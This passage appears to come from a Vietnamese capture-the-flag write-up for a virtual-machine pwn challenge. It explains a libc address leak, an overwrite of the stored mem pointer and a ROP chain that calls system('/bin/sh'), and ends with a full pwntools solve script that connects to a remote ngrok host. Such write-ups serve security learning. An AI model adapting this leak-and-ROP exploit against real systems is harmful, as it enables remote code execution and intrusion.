#### Leaking frame address
Có libc rồi, nhưng việc ghi đè xuống frame là không thể vì `SIZE = 0x20000`, vượt quá `int16_t`. Tuy nhiên, trên stack còn có một biến để lưu base address của `mem`, em vừa leak nó và overwrite nó thành return address để đưa ROP chain vào.
```python
chall.sendline(str(297).encode())
chall.recvline()

leak1 = int(chall.recvline()) & 0xffff
leak2 = int(chall.recvline()) & 0xffff
leak3 = int(chall.recvline()) & 0xffff
offs = 0x21ac80
leaked = (leak3 << (4*8)) + (leak2 << (2*8)) + leak1 
log.info('Leaked @ '+hex(leaked) )
```
#### Overwrite `mem`
Sau đó, em ghi đè giá trị của mem nằm trên stack
```python 
ret = leaked + ret_offs
payload1 = p64(ret)[0:4]
for i in range(0,len(payload1),2):
    chall.sendline(str(u16(payload1[i:i+2])).encode())
```
#### Execute code
Phần còn lại, em chỉnh mp trả về 0 để có thể ghi ROP chain lên return address của hàm main.
```python 
pop_rdi = 0x2a3e5
ret_gadget = 0x29139
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym["system"]
chain = flat([
    pop_rdi + base_libc,
    binsh + base_libc,
    ret_gadget + base_libc,
    system + base_libc,
])

    
for i in range(0,len(chain),2):
    chall.sendline(str(u16(chain[i:i+2])).encode())
chall.interactive()
```
### Solve script
:::spoiler Expand
```python
from pwn import *
import sys

#context.log_level = 'debug'
context.binary = exe = ELF('./prog-debug')
nc = '0.tcp.ap.ngrok.io'
p = 17865
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
if sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                      b *main+569
                      b *main+885
                      ''')
elif sys.argv[1] == 'connect':
    chall = remote(nc, p)
else:
    chall = process()
VM_NOP = p8(0x00)
VM_STO = p8(0x40)
VM_RET = p8(0x41)
VM_IMS = p8(0x52)
VM_DMS = p8(0x53)  
VM_INP = p8(0x20)
VM_OUT = p8(0x21)
VM_IMP = p8(0x50)
VM_DMP = p8(0x51)

def padding(s):
    return s + b'\x00'*(0x800-len(s))
libc_offs = ret_add = -0x120 #-0x120
exe_offs = -0x30 # -0x30
payload = (VM_INP + VM_IMS + VM_RET + VM_OUT + (VM_IMP + VM_RET + VM_OUT) * 3) + \
(VM_INP + VM_IMS ) + VM_RET + VM_OUT + (VM_IMP + VM_RET + VM_OUT)*3 + \
(VM_DMP)*3 + (VM_INP + VM_STO + VM_IMP) + (VM_DMP)*44 +(VM_IMP)*32 + VM_INP + VM_STO + (VM_IMP)*31 + \
(VM_INP + VM_STO + VM_IMP)*16
chall.sendafter(b'> ' , padding(payload))
chall.sendline(str(-0x140).encode())
chall.recvuntil(b'-\n') 
leak1 = int(chall.recvline()) & 0xffff
leak2 = int(chall.recvline()) & 0xffff
leak3 = int(chall.recvline()) & 0xffff
offs = 0x21ac80
leaked = (leak3 << (4*8)) + (leak2 << (2*8)) + leak1 
log.info('Leaked @ '+hex(leaked) )
base_libc = leaked - offs
log.info('Libc @ ' + hex(base_libc))
ret_offs = 0x20018 # 0x2013d = 2 * 0xfff0 + 349
#chall.interactive()
chall.sendline(str(297).encode())
chall.recvline()

leak1 = int(chall.recvline()) & 0xffff
leak2 = int(chall.recvline()) & 0xffff
leak3 = int(chall.recvline()) & 0xffff
offs = 0x21ac80
leaked = (leak3 << (4*8)) + (leak2 << (2*8)) + leak1 
log.info('Leaked @ '+hex(leaked) )

ret = leaked + ret_offs
payload1 = p64(ret)[0:4]
for i in range(0,len(payload1),2):
    chall.sendline(str(u16(payload1[i:i+2])).encode())

pop_rdi = 0x2a3e5
ret_gadget = 0x29139
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym["system"]
chain = flat([
    pop_rdi + base_libc,
    binsh + base_libc,
    ret_gadget + base_libc,
    system + base_libc,
])

    
for i in range(0,len(chain),2):
    chall.sendline(str(u16(chain[i:i+2])).encode())
chall.interactive()
```
:::
